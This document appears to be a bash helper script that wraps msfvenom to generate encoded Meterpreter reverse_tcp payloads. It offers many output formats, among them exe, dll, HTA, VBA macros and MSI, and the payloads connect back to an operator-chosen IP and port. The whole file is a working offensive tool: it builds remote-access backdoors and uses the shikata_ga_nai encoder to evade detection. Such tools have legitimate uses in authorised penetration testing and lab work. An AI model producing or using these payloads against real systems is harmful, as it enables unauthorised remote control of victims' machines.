#!/usr/bin/env bash

### Helpers begin
checkdeps() {
    for d in "${deps[@]}"; do
        [[ -n $(command -v $d) ]] || errx 128 "$d is not installed"
    done; unset d
}
err() { echo -e "${color:+\e[31m}[!] $@\e[0m"; }
errx() { echo -e "${color:+\e[31m}[!] ${@:2}\e[0m"; exit $1; }
good() { echo -e "${color:+\e[32m}[+] $@\e[0m"; }
info() { echo -e "${color:+\e[37m}[*] $@\e[0m"; }
long_opt() {
    local arg shift="0"
    case "$1" in
        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 127 ;;
        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 127; arg="$1" ;;
    esac
    echo "$arg"
    return $shift
}
subinfo() { echo -e "${color:+\e[36m}[=] $@\e[0m"; }
warn() { echo -e "${color:+\e[33m}[-] $@\e[0m"; }
### Helpers end

default_ip() {
    ip -o a | \
    perl -lne 'if (!/ lo / && /inet ([^\/]+)/) {print $1; exit}'
}

usage() {
    echo "Usage: ${0##*/} [OPTIONS] <format> [payload options]"
    echo
    echo "Simplify generating a meterpreter payload"
    echo
    echo "Options:"
    echo "    -h, --help         Display this help message"
    echo "    -i, --ip=IP        Connect back to specified IP address"
    echo "                       (default: $ip)"
    echo "    -l, --linux        Create linux meterpreter"
    echo "    --nocolor          Disable colorized output"
    echo "    -p, --port=PORT    Connect back to the specified port"
    echo "                       (default: $port)"
    echo "    -w, --windows      Create windows meterpreter (default"
    echo "                       behavior)"
    echo
    echo "Executable formats:"
    echo "    asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only,"
    echo "    exe-service, exe-small, hta-psh, loop-vbs, macho, msi,"
    echo "    msi-nouac, osx-app, psh, psh-net, psh-reflection,"
    echo "    psh-cmd, vba, vba-exe, vba-psh, vbs, war"
    echo
    echo "Transform formats:"
    echo "    bash, c, csharp, dw, dword, hex, java, js_be, js_le,"
    echo "    num, perl, pl, powershell, ps1, py, python, raw, rb,"
    echo "    ruby, sh, vbapplication, vbscript"
    echo
    exit $1
}

declare -a args deps
unset help
color="true"
deps+=("msfvenom")
deps+=("perl")
ip="$(default_ip)"
os="windows"
port=4444

# Check for missing dependencies
checkdeps

# Parse command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift && args+=("$@") && break ;;
        "-h"|"--help") help="true" ;;
        "-i"|"--ip"*) ip="$(long_opt "$@")" || shift ;;
        "-l"|"--linux") os="linux/x86" ;;
        "--nocolor") unset color ;;
        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
        "-w"|"--windows") os="windows" ;;
        *) args+=("$1") ;;
    esac
    shift
done
[[ -z ${args[@]} ]] || set -- "${args[@]}"

# Check for valid params
[[ -z $help ]] || usage 0
[[ $# -eq 1 ]] || usage 1

msfvenom -b "\x00" -e x86/shikata_ga_nai -f $1 \
    -p $os/meterpreter/reverse_tcp LHOST=$ip LPORT=$port ${@:2} \
    >meterpreter.$1
